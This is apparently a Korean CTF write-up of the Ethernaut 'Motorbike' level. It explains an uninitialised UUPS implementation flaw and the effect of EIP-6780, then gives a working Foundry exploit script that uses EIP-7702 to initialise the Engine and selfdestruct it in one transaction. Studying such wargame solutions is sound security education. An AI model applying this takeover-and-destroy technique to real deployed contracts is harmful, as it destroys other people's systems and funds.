---
title: "Ethernaut 25 Motorbike"
published: 2026-05-07
description: "Ethernaut 25 Motorbike 문제 풀이."
category: "CTF/Wargame"
tags: ["Web3", "Ethernaut", "Writeup"]
listed: false
---

## 문제
### 지문
Ethernaut's motorbike has a brand new upgradeable engine design.
Would you be able to `selfdestruct` its engine and make the motorbike unusable ?
Things that might help:
- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract
### 코드
```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```
## 배경지식
<hr />
`Motorbike`는 일반적인 프록시처럼 실제 로직을 직접 들고 있지 않고, EIP-1967 implementation slot에 저장된 주소로 모든 호출을 넘긴다.
```solidity
bytes32 internal constant _IMPLEMENTATION_SLOT =
    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```
이 슬롯은 `keccak256("eip1967.proxy.implementation") - 1`로 정해진 위치다. 프록시의 fallback은 이 슬롯에서 구현체 주소를 읽고 `delegatecall`한다. 따라서 사용자는 `Motorbike` 주소로 호출하지만, 실제 코드는 `Engine`에서 실행된다.
<hr />
이 문제는 UUPS 스타일 업그레이드 흐름을 단순화해서 보여준다. 업그레이드 함수가 프록시가 아니라 구현체인 `Engine` 안에 있다.
```solidity
function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}
```
UUPS에서는 implementation 컨트랙트 자체도 독립된 컨트랙트다. 프록시를 통해 호출하면 프록시 storage가 바뀌지만, implementation 주소를 직접 호출하면 implementation 자신의 storage가 바뀐다.
<hr />
`Engine.initialize()`는 `initializer` modifier를 사용한다.
```solidity
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```
프록시 생성자에서는 `_logic.delegatecall(abi.encodeWithSignature("initialize()"))`로 초기화한다. 이때 `delegatecall`이므로 초기화 상태와 `upgrader`는 프록시의 storage에 기록된다. 반대로 `Engine` implementation 컨트랙트 자신의 storage는 초기화되지 않는다.
implementation 주소를 직접 찾아서 `Engine.initialize()`를 호출하면, implementation 컨트랙트의 `upgrader`를 내 주소로 만들 수 있다.
<hr />
원래 이 문제의 의도는 `Engine` implementation을 `selfdestruct`해서 프록시가 더 이상 동작하지 못하게 만드는 것이었다. 그런데 Cancun/Dencun 이후 EIP-6780 때문에 `selfdestruct`의 의미가 바뀌었다.
현재 규칙에서는 `selfdestruct`가 같은 트랜잭션에서 생성된 컨트랙트에 실행될 때만 코드와 storage가 제거된다. 이미 이전 트랜잭션에서 존재하던 컨트랙트에 실행하면 잔액 전송 효과만 있고 코드는 삭제되지 않는다.
즉 사이트에서 `Get new instance`를 먼저 누르고, 나중에 별도 트랜잭션으로 `Engine`에 `selfdestruct`를 실행하는 예전 방식은 현재 Sepolia에서 통과되지 않는다.
<hr />
EIP-7702는 EOA가 특정 트랜잭션 동안 컨트랙트 코드처럼 동작할 수 있게 해준다. Foundry에서는 `vm.signAndAttachDelegation()`으로 authorization list를 붙일 수 있다.
이 문제에서 필요한 것은 `Ethernaut.createLevelInstance()`와 `Engine.selfdestruct`를 같은 트랜잭션 안에서 실행하는 것이다. 단순 컨트랙트가 대신 호출하면 Ethernaut에는 그 컨트랙트가 player로 기록되므로 사이트 계정의 완료 표시와 연결되지 않는다. 그래서 EIP-7702로 내 EOA가 직접 코드 실행 능력을 얻고, 내 EOA 주소로 instance 생성과 exploit을 한 트랜잭션 안에서 처리한다.
## 문제 코드 분석
<hr />
먼저 `Motorbike`의 프록시 구조를 보자.
```solidity
fallback() external payable virtual {
    _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
}
```
`Motorbike`에는 사용자 함수가 없다. 호출 데이터가 들어오면 implementation slot에 저장된 `Engine` 주소로 그대로 `delegatecall`한다. 그래서 `Motorbike`를 일반 컨트랙트처럼 사용하면 실제로는 `Engine` 코드가 프록시 storage 위에서 실행된다.
<hr />
이제 `Engine` implementation을 직접 초기화할 수 있는 부분을 보자.
```solidity
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```
프록시 생성자에서 `initialize()`가 이미 호출된 것처럼 보이지만, 그 호출은 `delegatecall`이었다. 따라서 초기화된 쪽은 프록시 storage이고, implementation 컨트랙트 자신의 `Initializable` storage는 그대로 비어 있다.
이 차이 때문에 `Engine` 주소를 직접 호출해서 `initialize()`를 다시 실행할 수 있다. 그러면 implementation 컨트랙트의 `upgrader`가 내 주소가 된다.
<hr />
다음으로 `upgradeToAndCall`의 `delegatecall` 흐름을 보자.
```solidity
function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
    _setImplementation(newImplementation);
    if (data.length > 0) {
        (bool success,) = newImplementation.delegatecall(data);
        require(success, "Call failed");
    }
}
```
`upgradeToAndCall()`은 `newImplementation`을 implementation slot에 저장한 뒤, 넘겨받은 `data`를 `newImplementation.delegatecall(data)`로 실행한다.
implementation 컨트랙트를 직접 호출한 상태에서 이 함수가 실행되면, delegatecall의 context는 `Engine` implementation 자신이다. 따라서 `newImplementation`에 `selfdestruct` 함수가 있고 그 함수를 delegatecall하면, 파괴 대상은 `newImplementation`이 아니라 호출 context인 `Engine`이 된다.
<hr />
현재 Ethernaut의 `MotorbikeFactory`는 instance의 engine 주소에 코드가 없어졌는지를 본다.
```solidity
function validateInstance(address payable _instance, address _player) public override returns (bool) {
    _player;
    Engine engine = Engine(engines[_instance]);
    return !Address.isContract(address(engine));
}
```
따라서 최종 목표는 `Motorbike` 프록시 자체가 아니라 `engines[_instance]`에 저장된 `Engine` implementation의 code size를 0으로 만드는 것이다.
문제는 EIP-6780 이후 이 조건을 만족하려면 `Engine`이 생성된 바로 그 트랜잭션 안에서 `selfdestruct`되어야 한다는 점이다. 그래서 풀이 흐름은 `createLevelInstance()`를 직접 호출하는 것부터 시작해야 한다.
## 풀이
과거 풀이는 implementation 주소를 찾고, implementation을 직접 초기화한 뒤, `upgradeToAndCall()`의 delegatecall로 `Engine`을 `selfdestruct`하는 방식이었다.
현재 Sepolia에서는 조건이 하나 더 붙는다. `Engine` 생성과 `selfdestruct` 실행이 같은 트랜잭션 안에 있어야 한다. 사이트 UI에서 미리 instance를 만들면 그 순간 `Engine` 생성 트랜잭션이 끝나므로 실패한다.
따라서 EIP-7702를 사용해 내 EOA가 다음 작업을 한 트랜잭션 안에서 실행하게 만든다.
1. `Ethernaut.createLevelInstance(MOTORBIKE_LEVEL)` 호출
2. `MotorbikeFactory`가 생성할 `Engine` 주소와 `Motorbike` 주소 계산
3. 방금 생성된 `Engine.initialize()` 직접 호출
4. `Engine.upgradeToAndCall(bomb, abi.encodeWithSelector(MotorbikeBomb.explode.selector))` 호출
5. 다음 트랜잭션에서 `Ethernaut.submitLevelInstance(motorbike)` 호출
`MotorbikeFactory`는 내부에서 먼저 `Engine`을 만들고, 그 다음 `Motorbike`를 만든다. 그래서 factory의 현재 nonce를 기준으로 다음 주소를 RLP 방식으로 계산할 수 있다.
- `engine = computeCreateAddress(motorbikeLevel, factoryNonce)`
- `motorbike = computeCreateAddress(motorbikeLevel, factoryNonce + 1)`
이렇게 생성된 instance는 `Ethernaut`에 내 EOA의 instance로 기록된다. 이후 `submitLevelInstance()`도 내 EOA로 호출하면 사이트의 완료 마크가 남는다.
### 익스플로잇
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

interface IEthernaut {
    function createLevelInstance(address level) external payable;
    function submitLevelInstance(address payable instance) external;
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeBomb {
    function explode() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Sol25Delegation {
    address private immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function solve(address ethernaut, address motorbikeLevel, uint256 factoryNonce, address bomb)
        external
        onlyOwner
        returns (address motorbike)
    {
        IEthernaut(ethernaut).createLevelInstance(motorbikeLevel);

        address engine = computeCreateAddress(motorbikeLevel, factoryNonce);
        motorbike = computeCreateAddress(motorbikeLevel, factoryNonce + 1);

        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(bomb, abi.encodeWithSelector(MotorbikeBomb.explode.selector));
    }

    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        if (nonce == 0) {
            return
                address(
                    uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80)))))
                );
        }
        if (nonce <= 0x7f) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 nonce8 = uint8(nonce);
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, nonce8)))));
        }
        if (nonce <= type(uint8).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 nonce8 = uint8(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), nonce8)))
                )
            );
        }
        if (nonce <= type(uint16).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint16 nonce16 = uint16(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), nonce16)))
                )
            );
        }
        if (nonce <= type(uint24).max) {
            // forge-lint: disable-next-line(unsafe-typecast)
            uint24 nonce24 = uint24(nonce);
            return address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), nonce24)))
                )
            );
        }

        // forge-lint: disable-next-line(unsafe-typecast)
        uint32 nonce32 = uint32(nonce);
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), nonce32))))
        );
    }
}

contract Sol25 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_INSTANCE"));
        address motorbikeLevel = vm.envAddress("MOTORBIKE_LEVEL");
        uint256 factoryNonce = vm.envOr("MOTORBIKE_FACTORY_NONCE", uint256(vm.getNonce(motorbikeLevel)));

        vm.broadcast(privateKey);
        Sol25Delegation implementation = new Sol25Delegation(player);

        vm.broadcast(privateKey);
        MotorbikeBomb bomb = new MotorbikeBomb();

        vm.broadcast(privateKey);
        vm.signAndAttachDelegation(address(implementation), privateKey);
        address motorbike =
            Sol25Delegation(payable(player)).solve(address(ethernaut), motorbikeLevel, factoryNonce, address(bomb));

        vm.broadcast(privateKey);
        ethernaut.submitLevelInstance(payable(motorbike));
    }
}

contract Sol25Clear is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.signAndAttachDelegation(address(0), privateKey);
        vm.broadcast(privateKey);
        (bool success,) = payable(vm.addr(privateKey)).call("");
        require(success, "clear delegation failed");
    }
}
```
![screenshot](./image-1.png)
